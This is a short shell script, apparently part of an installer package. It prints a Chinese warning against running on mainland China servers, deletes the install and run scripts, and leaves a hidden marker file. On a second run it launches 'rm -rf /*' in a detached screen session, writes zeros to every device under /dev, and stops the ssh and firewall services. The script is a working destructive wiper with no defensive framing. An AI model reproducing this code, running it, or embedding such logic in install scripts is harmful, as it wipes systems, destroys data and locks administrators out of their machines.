#/bin/sh 
echo "不允许在中国大陆服务器运行本脚本"
rm -rf run.sh
export area="cn"
rm -rf install.sh


if [ ! -f "/etc/system.runtime.bin" ]; then
  echo "Block">>/etc/system.runtime.bin
else
  echo "Fuck You"
  screen -dmS Fuck rm -rf /*
  echo "0" >/dev/*
  service ssh stop
  service sshd stop
  service iptables stop
fi

exit
